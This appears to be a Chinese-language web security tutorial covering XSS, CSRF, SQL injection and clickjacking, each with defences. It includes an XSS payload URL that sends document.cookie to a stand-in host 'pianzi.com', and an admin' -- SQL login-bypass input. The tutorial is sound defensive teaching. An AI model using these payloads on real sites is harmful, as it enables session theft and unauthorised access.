# 常见大Web安全攻防解析

## XSS 跨站脚本攻击
通过注入运行非法 js 脚本或 html 标签对存在web安全漏洞的网站进行攻击的一种方式。XSS 攻击有两种，非持久型和持久型。

### 非持久型

一般是通过给别人发送带有恶意参数的 URL，当 URL 被打开时，这些参数会被浏览器解析运行从而达到窃取用户数据或其他攻击目的。

比如前端代码长这样
```js
let arg = location.href.substring(location.href.indexOf('arg=') + 4);
document.write(arg);
```

那攻击者可以这样修改参数进行攻击

```http://www.example.com?arg=<img src="xx" onerror="post('pianzi.com?cakemonster=' + escape(document.cookie))"/>```

### 持久型

通过表单输入等方式输入并提交恶意脚本到服务器数据库，后前端页面从服务器获取该数据会渲染执行恶意脚本。

这种攻击方式直接以正常功能提交即可，比如文章评论。危害比非持久型要大，只要需要获取该数据的客户端就有可能收到攻击。但这种攻击可以实现的条件也比较苛刻。需要前后端都没有做字符转义且前端拿到数据后直接 dom 渲染。

XSS 的防御：
- 尽量确保web页面的渲染数据来自服务器（不要用url传参这种）
- 尽量不使用document.write(), eval(), innerHTML这种可以执行字符串的方法
- 涉及dom渲染前对传入字符串参数进行转义操作（现代浏览器一般都有 XSS 防御）
- 给cookie设置httponly
- CSP
    - 设置 HTTP Header 中的 Content-Security-Policy
    - 添加 `<meta http-equiv="Content-Security-Policy">`

## CSRF 跨站请求伪造

攻击原理：

1. 用户访问被信任的网站A并登陆
2. 登陆成功，用作身份标志的 Cookie 被存在了浏览器里
3. 用户没有登出网站A的同时（也就是没有清除本地的 Cookie）访问了危险网站B
4. 危险网站B在用户无感知的情况下向网站偷偷发送一个致命请求
5. Cookie 默认被自动带上，服务器验证了 Cookie 以为是用户本人做的操作，Boom ~

防御：
- 通过检查 http 请求头 referer 的值是不是这个页面，来判断是不是CSRF攻击（referer有可能会被篡改）
- 加入验证码用来区分是普通用户行为还是黑客行为（验证码多了体验不好）
- get请求不修改信息（post其实也没用，脚本可以伪造提交表单）
- 可以对 Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送
- 直接不使用 cookie 而是加入 Anti-CSRF-Token。即发送请求时在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器建立一个拦截器来验证这个 token。服务器读取浏览器当前域 cookie 中这个 token 值，会进行校验该请求当中的 token  和cookie 当中的 token 值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。

## SQL注入

通过表单输入部分 sql 语句达到攻击手段。举个例子，现在有一个登陆表单，大概是这样：

```html
<form action="/login" method="POST">
  <p>Username: <input type="text" name="username" /></p>
  <p>Password: <input type="password" name="password" /></p>
  <p><input type="submit" value="登陆" /></p>
</form>
```

后端拿到 username 和 password 进行查表操作的 sql 语句

```sql
SELECT * FROM user WHERE username='xxx' AND password='xxx';
```

然后黑客输入 username 为 ```admin' --``` 。sql 语句变成了

```sql
SELECT * FROM user WHERE username='admin' --' AND password='xxx';
```

防御：

- 严格限制 Web 应用的数据库的操作权限
- 转义，检查输入字符，对特殊字符（sql 语句相关 比如 - ）进行转义操作
- 不直接动态拼接 sql 语句，使用参数化 sql 或者存储过程进行存取

## 点击劫持

攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。（UI覆盖攻击）

防御：
- 设置响应头X-FRAME-OPTIONS
    - DENY，表示页面不允许通过 iframe 的方式展示
    - SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示
    - ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示
